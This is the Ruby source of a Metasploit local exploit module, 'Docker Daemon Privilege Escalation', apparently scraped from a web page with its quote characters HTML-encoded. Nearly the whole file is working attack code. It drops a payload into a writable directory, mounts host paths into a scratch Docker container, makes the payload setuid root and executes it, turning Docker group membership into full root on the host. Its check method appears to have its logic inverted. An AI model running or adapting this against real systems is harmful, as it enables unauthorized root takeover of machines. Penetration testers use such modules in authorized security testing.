# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
class MetasploitModule < Msf::Exploit::Local
 
  Rank = ExcellentRanking
 
  include Msf::Post::File
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper
 
  def initialize(info={})
    super(update_info(info, {
      &#039;Name&#039;           => &#039;Docker Daemon Privilege Escalation&#039;,
      &#039;Description&#039;    => %q{
        This module obtains root privileges from any host account with access to the
        Docker daemon. Usually this includes accounts in the `docker` group.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         => [&#039;forzoni&#039;],
      &#039;DisclosureDate&#039; => &#039;Jun 28 2016&#039;,
      &#039;Platform&#039;       => &#039;linux&#039;,
      &#039;Arch&#039;           => [ARCH_X86, ARCH_X86_64, ARCH_ARMLE, ARCH_MIPSLE, ARCH_MIPSBE],
      &#039;Targets&#039;        => [ [&#039;Automatic&#039;, {}] ],
      &#039;DefaultOptions&#039; => { &#039;PrependFork&#039; => true, &#039;WfsDelay&#039; => 60 },
      &#039;DefaultTarget&#039;  => 0
      }
    ))
    register_advanced_options([
      OptString.new("WritableDir", [true, "A directory where we can write files", "/tmp"])
    ], self.class)
  end
 
  def check
    if cmd_exec(&#039;docker ps && echo true&#039;) == &#039;true&#039;
      print_error("Failed to access Docker daemon.")
      Exploit::CheckCode::Safe
    else
      Exploit::CheckCode::Vulnerable
    end
  end
 
  def exploit
    pl = generate_payload_exe
    exe_path = "#{datastore[&#039;WritableDir&#039;]}/#{rand_text_alpha(6 + rand(5))}"
    print_status("Writing payload executable to &#039;#{exe_path}&#039;")
 
    write_file(exe_path, pl)
    register_file_for_cleanup(exe_path)
 
    print_status("Executing script to create and run docker container")
    vprint_status cmd_exec("chmod +x #{exe_path}")
    vprint_status shell_script(exe_path)
    vprint_status cmd_exec("sh -c &#039;#{shell_script(exe_path)}&#039;")
 
    print_status "Waiting #{datastore[&#039;WfsDelay&#039;]}s for payload"
  end
 
  def shell_script(exploit_path)
    deps = %w(/bin /lib /lib64 /etc /usr /opt) + [datastore[&#039;WritableDir&#039;]]
    dep_options = deps.uniq.map { |dep| "-v #{dep}:#{dep}" }.join(" ")
 
    %Q{
      IMG=`(echo "FROM scratch"; echo "CMD a") | docker build -q - | awk "END { print \\\\$NF }"`
      EXPLOIT="chown 0:0 #{exploit_path}; chmod u+s #{exploit_path}"
      docker run #{dep_options} $IMG /bin/sh -c "$EXPLOIT"
      docker rmi -f $IMG
      #{exploit_path}
    }.strip.split("\n").map(&:strip).join(&#039;;&#039;)
  end
 
end

